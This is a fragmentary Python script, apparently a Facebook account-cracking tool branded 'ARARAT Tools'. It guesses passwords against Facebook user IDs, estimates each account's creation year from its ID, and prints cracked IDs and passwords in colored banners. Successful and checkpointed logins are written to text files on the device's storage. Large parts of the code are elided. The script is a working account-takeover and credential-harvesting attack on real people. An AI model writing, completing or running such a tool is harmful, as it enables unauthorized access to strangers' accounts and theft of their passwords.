...
ha = current.day
today = date.today()
os.system('xdg-open https://t.me/ARARATForid')
import os
...
os.system('espeak -a 300 " Welcome to the ARARAT Tools,"')
...
def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :ARARAT = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :ARARAT = '√ 2009'
        elif uid[:8] in ['10000000']        :ARARAT = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:ARARAT = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:ARARAT = ' 2010'
        elif uid[:6] in ['100001']          :ARARAT = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :ARARAT = '√ 2011/2012'
        elif uid[:6] in ['100004']          :ARARAT = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :ARARAT = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :ARARAT = '√ 2014/2015'
        elif uid[:6] in ['100009']          :ARARAT = '√ 2015'
        elif uid[:5] in ['10001']           :ARARAT = '√ 2015/2016'
        elif uid[:5] in ['10002']           :ARARAT = '√ 2016/2017'
        elif uid[:5] in ['10003']           :ARARAT = '√ 2018/2019'
        elif uid[:5] in ['10004']           :ARARAT = '√ 2019/2020'
        elif uid[:5] in ['10005']           :ARARAT = '√ 2020'
        elif uid[:5] in ['10006','10007','']:ARARAT = '√ 2021'
        elif uid[:5] in ['10008']           :ARARAT = '√ 2022'
        elif uid[:5] in ['10009']           :ARARAT = '√ 2023'
        else:ARARAT=''
...
#____((𝑼𝑷𝑫𝑨𝑻𝑬-𝑺𝒀𝑺𝑻𝑬𝑴-Md Forid))            
    ...
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'ARARAT',
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 𝙀𝙈𝙍𝘼𝙉\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     The ARARAT𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     The ARARAT𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/The ARARAT-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
...
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open('/sdcard/\033[38;5;46mThe ARARAT-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['ARARAT','ARARAT ','ARARAT '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}The ARARAT\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46mARARAT>💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()
